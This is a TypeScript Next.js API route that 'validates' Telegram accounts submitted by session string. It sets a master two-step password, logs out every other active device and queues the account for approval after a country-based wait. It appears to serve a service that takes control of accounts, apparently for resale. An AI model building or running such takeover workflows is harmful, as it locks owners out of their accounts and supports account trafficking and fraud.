import { NextRequest, NextResponse } from 'next/server'
import { getCollection, Collections } from '@/lib/mongodb/client'
import { getActiveSessions, logoutOtherDevices, setMasterPassword } from '@/lib/telegram/auth'
import { ObjectId } from 'mongodb'

interface ValidationResult {
  accountId: string
  status: 'accepted' | 'rejected' | 'pending'
  reason?: string
  sessionsCount?: number
  loggedOutCount?: number
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { accountId, phoneNumber, sessionString, masterPassword } = body

    if (!accountId || !phoneNumber || !sessionString) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    console.log(`[ValidateAccount] Starting validation for account ${phoneNumber}`)

    const accounts = await getCollection(Collections.ACCOUNTS)
    const settingsCollection = await getCollection(Collections.SETTINGS)
    const account = await accounts.findOne({ _id: new ObjectId(accountId) })

    if (!account) {
      return NextResponse.json(
        { error: 'Account not found' },
        { status: 404 }
      )
    }

    // Step 1: Set master password in background
    let configuredMasterPassword: string | undefined
    try {
      const setting = await settingsCollection.findOne({ setting_key: 'master_password' })
      if (typeof setting?.setting_value === 'string' && setting.setting_value.trim().length > 0) {
        configuredMasterPassword = setting.setting_value.trim()
      }
    } catch (settingsError) {
      console.error('[ValidateAccount] Failed to load master password setting:', settingsError)
    }

    const sanitizedRequestPassword = (typeof masterPassword === 'string' && masterPassword.trim().length > 0)
      ? masterPassword.trim()
      : undefined
    const fallbackMasterPassword = `MP_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
    const effectiveMasterPassword = sanitizedRequestPassword || configuredMasterPassword || fallbackMasterPassword

    console.log('[ValidateAccount] Step 1: Setting master password...')
    const masterPasswordResult = await setMasterPassword(
      sessionString,
      effectiveMasterPassword
    )

    if (!masterPasswordResult.success) {
      // Failed to set master password = Fake account
      console.log('[ValidateAccount] ❌ Failed to set master password - FAKE ACCOUNT')
      
      await accounts.updateOne(
        { _id: new ObjectId(accountId) },
        {
          $set: {
            status: 'rejected',
            rejection_reason: 'Fake Account - Master password setting failed',
            rejected_at: new Date(),
            updated_at: new Date()
          }
        }
      )

      return NextResponse.json({
        success: false,
        result: {
          accountId,
          status: 'rejected',
          reason: 'Fake Account - Master password setting failed',
        } as ValidationResult
      })
    }

    console.log('[ValidateAccount] ✅ Master password set successfully')

    // Step 2: Check active device sessions
    console.log('[ValidateAccount] Step 2: Checking active sessions...')
    const sessionsResult = await getActiveSessions(sessionString)

    if (!sessionsResult.success || !sessionsResult.sessions) {
      console.log('[ValidateAccount] ⚠️ Could not retrieve sessions, proceeding with caution')
    } else {
      const sessionCount = sessionsResult.sessions.length
      console.log(`[ValidateAccount] Found ${sessionCount} active sessions`)

      // Step 3: If multiple devices, logout all others
      if (sessionCount > 1) {
        console.log('[ValidateAccount] Step 3: Multiple devices detected, logging out others...')
        
        const logoutResult = await logoutOtherDevices(sessionString)
        
        if (logoutResult.success) {
          console.log(`[ValidateAccount] ✅ Logged out ${logoutResult.loggedOutCount} devices`)
          
          // Update account with logout info
          await accounts.updateOne(
            { _id: new ObjectId(accountId) },
            {
              $set: {
                multiple_devices_detected: true,
                devices_logged_out: logoutResult.loggedOutCount,
                last_session_check: new Date(),
                updated_at: new Date()
              }
            }
          )
        } else {
          console.log('[ValidateAccount] ⚠️ Failed to logout other devices')
        }
      } else {
        console.log('[ValidateAccount] ✅ Single device detected')
      }

      // Store session count for wait time validation
      await accounts.updateOne(
        { _id: new ObjectId(accountId) },
        {
          $set: {
            initial_session_count: sessionCount,
            master_password_set: true,
            last_session_check: new Date(),
            updated_at: new Date()
          }
        }
      )
    }

    // Step 4: Move to pending list with country wait time
    console.log('[ValidateAccount] Step 4: Moving to pending list...')
    
    await accounts.updateOne(
      { _id: new ObjectId(accountId) },
      {
        $set: {
          status: 'pending',
          validation_stage: 'pending_approval',
          pending_since: new Date(),
          updated_at: new Date()
        }
      }
    )

    console.log('[ValidateAccount] ✅ Account moved to pending list')

    return NextResponse.json({
      success: true,
      result: {
        accountId,
        status: 'pending',
        sessionsCount: sessionsResult.sessions?.length || 0,
      } as ValidationResult
    })
  } catch (error: any) {
    console.error('[ValidateAccount] Error:', error)
    return NextResponse.json(
      { error: error.message || 'Internal server error' },
      { status: 500 }
    )
  }
}

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const accountId = searchParams.get('accountId')

    if (!accountId) {
      return NextResponse.json(
        { error: 'Account ID required' },
        { status: 400 }
      )
    }

    const accounts = await getCollection(Collections.ACCOUNTS)
    const account = await accounts.findOne({ _id: new ObjectId(accountId) })

    if (!account) {
      return NextResponse.json(
        { error: 'Account not found' },
        { status: 404 }
      )
    }

    // Check if account is still pending and wait time has passed
    if (account.status !== 'pending') {
      return NextResponse.json({
        accountId,
        status: account.status,
        message: `Account is ${account.status}`,
      })
    }

    // Get country capacity to determine wait time
    const countryCapacity = await getCollection(Collections.COUNTRY_CAPACITY)
    const phoneDigits = account.phone_number.replace(/[^\d]/g, '')
    
    let autoApproveMinutes = 1440 // Default 24 hours
    let countryFound = false

    for (let i = 1; i <= Math.min(4, phoneDigits.length) && !countryFound; i++) {
      const possibleCode = phoneDigits.substring(0, i)
      const country = await countryCapacity.findOne({ 
        $or: [
          { country_code: possibleCode },
          { country_code: `+${possibleCode}` }
        ]
      })

      if (country) {
        autoApproveMinutes = country.auto_approve_minutes ?? 1440
        countryFound = true
      }
    }

    if (!countryFound) {
      const settings = await getCollection(Collections.SETTINGS)
      const globalSetting = await settings.findOne({ setting_key: 'auto_approve_minutes' })
      autoApproveMinutes = parseInt(globalSetting?.setting_value || '1440')
    }

    const now = new Date()
    const pendingSince = account.pending_since || account.created_at
    const minutesPassed = (now.getTime() - pendingSince.getTime()) / (1000 * 60)
    
    return NextResponse.json({
      accountId,
      status: account.status,
      waitTimeMinutes: autoApproveMinutes,
      minutesPassed: minutesPassed.toFixed(2),
      minutesRemaining: Math.max(0, autoApproveMinutes - minutesPassed).toFixed(2),
      readyForFinalValidation: minutesPassed >= autoApproveMinutes,
    })
  } catch (error: any) {
    console.error('[ValidateAccount] GET Error:', error)
    return NextResponse.json(
      { error: error.message || 'Internal server error' },
      { status: 500 }
    )
  }
}
